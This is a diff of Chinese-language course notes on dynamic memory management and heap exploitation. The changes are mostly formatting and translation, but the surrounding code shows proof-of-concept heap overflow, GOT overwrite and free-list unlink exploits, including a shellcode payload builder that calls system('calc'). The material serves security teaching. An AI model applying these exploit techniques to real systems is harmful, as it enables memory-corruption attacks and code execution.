@@ -1,6 +1,7 @@
 ---
 tags:
   - 软件安全
+comments: true
 ---
 # 动态内存管理
 ## 动态内存管理函数
@@ -131,8 +132,8 @@ tags:
 	}
 	```
 
-    1. wrong
-    2. ok - temp variable used
+    1. 错误的用法
+    2. 没问题——使用了临时变量
 
 4. 多次释放内存
 	* 复制粘贴时忘记修改相应的`free`代码
@@ -194,7 +195,7 @@ tags:
 * 已分配块和空闲块都使用一个PREV_INUSE位区分
 	* 块大小总是偶数，PREV_INUSE位被存储于块大小的低位中
 * 空闲块被组织成筐
-![chunks2](md-img/20191021_03.png)
+    ![chunks2](md-img/20191021_03.png)
 	* 由头索引
 	* 筐中的块大约同样大小
 	* 还有一个包含最近释放的块的筐作为缓存
@@ -336,7 +337,7 @@ tags:
 			```c linenums="1" hl_lines="13-16 19 21 24"
 			static char *GOT_LOCATION = (char *)0x0804c98c;
 			static char shellcode[] =
-			"\xeb\x0cjump12chars_"   /* jump */
+			"\xeb\x0cjump12chars_" /* jump */
 			"\x90\x90\x90\x90\x90\x90\x90\x90"
 
 			int main(void){
@@ -428,19 +429,19 @@ tags:
 	```c linenums="1" hl_lines="8-12 14"
 	unsigned char shellcode[] = "\x90\x90\x90\x90";
 	unsigned char malArg[] = "0123456789012345"
-				"\x05\x00\x03\x00\x00\x00\x08\x00"       
+				"\x05\x00\x03\x00\x00\x00\x08\x00"
 				"\xb8\xf5\x12\x00\x40\x90\x40\x00";
 	void mem() {
 		HANDLE hp;
 		HLOCAL h1 = 0, h2 = 0, h3 = 0, h4 = 0;
-	    hp = HeapCreate(0, 0x1000, 0x10000);
-	    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
+	    hp = HeapCreate(0, 0x1000, 0x10000);
+	    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
 		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128);
-	    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
-	    HeapFree(hp,0,h2); /* (1) */
-	    memcpy(h1, malArg, 32); 	// (2)
-	    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128); // (3)
-		/* (4) */
+	    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
+	    HeapFree(hp,0,h2); // (1)
+	    memcpy(h1, malArg, 32); 	// (2)
+	    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128); // (3)
+		// (4)!
 		return;
 	}
 	int _tmain(int argc, _TCHAR* argv[]) {
@@ -460,12 +461,12 @@ tags:
     ```c title="vuln.c"
 	int mem(char *buf) {
 		HLOCAL h1 = 0, h2 = 0;
-		HANDLE hp;		   
+		HANDLE hp;
 		hp = HeapCreate(0, 0x1000, 0x10000);	// (1)
 		if (!hp) return -1;
-		h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260); /* (2) */
+		h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260); // (2)
 		strcpy((char *)h1, buf); // (3)
-		/* (4) */
+		// (4)!
 		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260);
 		printf("we never get here");
 		return 0;
@@ -477,7 +478,7 @@ tags:
 		mem(buffer);
 		return 0;
 	}
-	/* (5) */
+	/* (5)! */
 	char buffer[1000]="";
 	void buildMalArg() {
 		int addr = 0, i = 0;
@@ -486,11 +487,11 @@ tags:
 		systemAddr = GetAddress("msvcrt.dll","system");
 		for (i = 0; i < 66; i++) strcat(buffer, "DDDD");
 		strcat(buffer, "\xeb\x14");
-		strcat(buffer, "\x44\x44\x44\x44\x44\x44"); /* (6) */
-		strcat(buffer, "\x73\x68\x68\x08"); /* (7) */
+		strcat(buffer, "\x44\x44\x44\x44\x44\x44"); // (6)
+		strcat(buffer, "\x73\x68\x68\x08"); // (7)
 		strcat(buffer, "\x4c\x04\x5d\x7c");
 		for (i = 0; i < 21; i++) strcat(buffer,"\x90");
-		strcat(buffer, "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"); /* (8) */
+		strcat(buffer, "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"); // (8)
 		fixupaddresses(tmp, systemAddr);
 		strcat(buffer,tmp);
 		strcat(buffer,"\xFF\xD1\x90\x90");
@@ -524,22 +525,22 @@ tags:
 
     ```c linenums="1" hl_lines="12-14"
 	typedef struct _unalloc {
-	    PVOID fp;
-	    PVOID bp;
+	    PVOID fp;
+	    PVOID bp;
 	} unalloc, *Punalloc;
 	char shellcode[] = "\x90\x90\x90\xb0\x06\x90\x90";
 	int _tmain(int argc, _TCHAR* argv[]) {
-	    Punalloc h1;
-	    HLOCAL h2 = 0;
-	    HANDLE hp;
-	    hp = HeapCreate(0, 0x1000, 0x10000);
-	    h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);     //(1)
-	    HeapFree(hp, 0, h1);                                    //(2)
-	    h1->fp = (PVOID)(0x042B17C - 4);                        //(3)
-	    h1->bp = shellcode;
-	    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);               //(4)
-	    HeapFree(hp, 0, h2);                                    //(5)
-	    return 0;
+	    Punalloc h1;
+	    HLOCAL h2 = 0;
+	    HANDLE hp;
+	    hp = HeapCreate(0, 0x1000, 0x10000);
+	    h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);     //(1)
+	    HeapFree(hp, 0, h1);                                    //(2)
+	    h1->fp = (PVOID)(0x042B17C - 4);                        //(3)
+	    h1->bp = shellcode;
+ 	    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);               //(4)
+	    HeapFree(hp, 0, h2);                                    //(5)
+        return 0;
 	}
 	```
 
